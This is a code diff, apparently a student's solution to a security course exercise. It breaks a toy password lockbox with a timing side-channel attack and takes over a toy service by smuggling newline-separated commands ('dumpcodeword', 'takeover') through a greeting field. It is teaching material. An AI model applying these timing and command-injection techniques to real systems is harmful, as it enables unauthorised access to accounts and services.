@@ -17,31 +17,44 @@ from e5utils import LockBox, Facade
 def break_lockbox(lockbox: LockBox) -> Tuple[str, str]:
     discovered_password = ''
     while True:
-        times = []
+        longest_time = 0
+        next_char = ''
+
+        for _ in range(100):
+            lockbox.try_password("josh") #warmup my cpu
+
         for char in ascii_lowercase:
-            start_time = perf_counter_ns()
-            lockbox.try_password(discovered_password + char)
-            end_time = perf_counter_ns()
-            times.append((end_time - start_time, char))
+            total_time = 0
+            iterations = 10  # Number of iterations for averaging
+
+            for _ in range(iterations):
+                start_time = perf_counter_ns()
+                lockbox.try_password(discovered_password + char)
+                end_time = perf_counter_ns()
+                total_time += end_time - start_time
+
+            average_time = total_time / iterations
+
+            if average_time > longest_time:
+                longest_time = average_time
+                next_char = char
         
-        times.sort(reverse=True)
-        next_char = times[0][1]
         discovered_password += next_char
-        if lockbox.try_password(discovered_password):
-            return (discovered_password, lockbox.try_password(discovered_password))
+        contents = lockbox.try_password(discovered_password)
+        if contents is not None:
+            return (discovered_password, contents)
     
 
 # NOTE: Returns a string corresponding to the result from successfully
 # calling `takeover` on a `CaerfilyDesinedSurvis`. 
 def break_facade(facade: Facade) -> str:
-    injected_command = "name\ndumpcodeword"
-    results = facade.greet(injected_command)
-    codeword = results[1]  # Assuming the second line of output is the codeword
-    takeover_command = f"takeover {codeword}"
-    takeover_results = facade.__service.execute(takeover_command)
-    return takeover_results[0]
-    
-    
-    
+    # my code wordk
+    injected_command_for_codeword = "name\ndumpcodeword"
+    results = facade.greet(injected_command_for_codeword)
+    codeword = results[-1]  # Assuming the last line of output is the codeword
+
+    injected_command_for_takeover = f"name\ntakeover {codeword}"
+    takeover_results = facade.greet(injected_command_for_takeover)
+    return takeover_results[-1]
     
     
